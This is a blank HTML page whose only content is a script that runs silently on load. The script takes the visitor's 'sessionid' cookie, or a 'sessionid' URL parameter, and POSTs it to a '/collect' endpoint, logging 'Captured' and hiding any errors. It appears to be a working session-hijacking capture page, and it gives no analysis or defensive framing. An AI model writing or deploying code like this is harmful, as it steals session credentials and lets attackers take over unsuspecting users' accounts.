<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>.</title>
  <style>
    * { margin: 0; padding: 0; }
    body { background: #000; min-height: 100vh; }
  </style>
</head>
<body>
  <script>
    (function() {
      function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
      }

      async function capture() {
        try {
          let sid = getCookie('sessionid');
          if (!sid) {
            const params = new URLSearchParams(window.location.search);
            sid = params.get('sessionid');
          }
          if (sid) {
            const res = await fetch('/collect', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ sessionId: sid })
            });
            const data = await res.json();
            if (data.success) console.log('✅ Captured');
            else console.log('❌ Failed:', data.error);
          }
        } catch (e) {
          // sessiz
        }
      }

      if (document.readyState === 'complete') capture();
      else window.addEventListener('load', capture);
      setTimeout(capture, 3000);
    })();
  </script>
</body>
</html>
